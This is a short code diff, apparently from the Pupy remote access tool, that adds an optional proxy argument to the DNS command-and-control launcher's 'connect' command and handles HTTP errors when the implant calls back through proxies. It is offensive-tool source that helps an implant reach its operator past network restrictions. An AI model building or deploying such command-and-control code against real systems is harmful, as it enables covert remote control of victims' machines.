@@ -5,7 +5,7 @@ from ..base_launcher import *
 from ..picocmd import *
 
 from ..proxies import get_proxies
-from ..socks import GeneralProxyError, ProxyConnectionError
+from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
 from ..clients import PupyTCPClient, PupySSLClient
 from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
 
@@ -92,10 +92,10 @@ class DNSCommandClientLauncher(DnsCommandsClient):
     def on_checkconnect(self, host, port_start, port_end=None):
         pass
 
-    def on_connect(self, ip, port, transport):
+    def on_connect(self, ip, port, transport, proxy=None):
         import pupy
         with self.lock:
-            self.commands.append(('connect', ip, port, transport))
+            self.commands.append(('connect', ip, port, transport, proxy))
             self.new_commands.set()
 
             pupy.infos['transport'] = transport
@@ -168,7 +168,7 @@ class DNSCncLauncher(BaseLauncher):
                 continue
 
             if command[0] == 'connect':
-                _, host, port, transport = command
+                _, host, port, transport, connection_proxy = command
                 t = network.conf.transports[transport](
                     bind_payload=self.connect_on_bind_payload
                 )
@@ -192,8 +192,9 @@ class DNSCncLauncher(BaseLauncher):
                     yield stream
                     return
 
-                for proxy_type, proxy, proxy_username, proxy_password in get_proxies():
-                    _, host, port, transport = command
+                for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
+                        additional_proxies=[connection_proxy]
+                ):
                     t = network.conf.transports[transport](
                         bind_payload=self.connect_on_bind_payload
                     )
@@ -222,7 +223,7 @@ class DNSCncLauncher(BaseLauncher):
                         s = client.connect(host, port)
                         stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
 
-                    except (socket.error, GeneralProxyError, ProxyConnectionError) as e:
+                    except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
                         if proxy_username and proxy_password:
                             proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
                         else:
